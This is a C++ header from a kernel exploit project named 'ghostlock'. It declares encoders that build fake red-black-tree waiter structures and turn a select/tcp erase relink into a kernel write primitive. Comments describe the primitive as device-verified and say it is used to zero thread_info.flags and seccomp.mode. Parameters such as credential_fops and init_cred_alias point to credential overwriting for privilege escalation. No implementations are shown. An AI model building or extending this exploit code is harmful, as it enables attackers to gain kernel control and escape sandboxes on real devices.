#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock::memory {
    /* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout.
 *
 * Value space (device-verified): the select/tcp erase relink stores exactly one
 * of
 *   - zero, through the leaf arm (`preserve_child == false`): the waiter is
 *     stamped {pc = target - 8, right = 0, left = target} and the relink
 *     stores 0 at [target];
 *   - a *dereferenceable kernel pointer*, through the value arm
 *     (`preserve_child == true`): {pc = value, right = 0, left = target} and
 *     the relink stores `value` at [target].
 *
 * Anything else (a bitmask, or a user-space-looking word) is outside that
 * space: the walk consumes `value` as an rb parent pointer, so a value that is
 * not a mapped kernel address never reaches the store. A caller that needs to
 * clear bits must therefore find a word where zeroing the whole 64-bit slot is
 * correct - W3 clears thread_info.flags and seccomp.mode this way.
 *
 * Historical note: the removed mask arm used `~(1ULL << bit)`, which sets every
 * OTHER bit to 1 rather than preserving the live flags, so it was never a
 * correct flag-clearing value even in principle. A blind store cannot express a
 * read-modify-write; only a whole-word zero is both storable and correct. */
    enum class WriteMode : int32_t {
        Disabled = 0,
        Zero = 1,
        Credential = 2,
    };

    struct WriteRequest final {
        std::uintptr_t target = 0;
        WriteMode mode = WriteMode::Disabled;
        bool preserve_child = false;

        [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                         WriteMode mode,
                                                         bool leaf) noexcept {
            return WriteRequest{target, mode, !leaf};
        }
    };

    struct PayloadWriteLayout final {
        std::uintptr_t parent = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
        std::uintptr_t fops = 0;
        bool needs_credential_copy = false;
    };

    static_assert(std::is_standard_layout_v<WriteRequest>);
    static_assert(std::is_trivially_copyable_v<WriteRequest>);
    static_assert(offsetof(WriteRequest, target) == 0);
    static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
    static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
    static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

    /* Fixed payload fragment sizes shared by the encoders and their callers. */
    inline constexpr std::size_t kCompactWaiterBytes = 0x30;

    /* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
    [[nodiscard]] bool encode_compact_waiter(
        std::span<std::byte> waiter, const WriteRequest &request,
        const PayloadWriteLayout &layout) noexcept;

    [[nodiscard]] bool encode_multicast_waiter(
        std::span<std::byte> buffer, std::size_t waiter_offset,
        std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
        std::uintptr_t fake_lock) noexcept;
} // namespace ghostlock::memory

namespace ghostlock::memory {
    /* Resolve the request-dependent words shared by the three route encoders. */
    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

    /* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

    /* Fixed request/layout vectors, including the upstream unified compact arm. */
    int32_t payload_builder_fixed_vector_test(void);
} // namespace ghostlock::memory

#endif
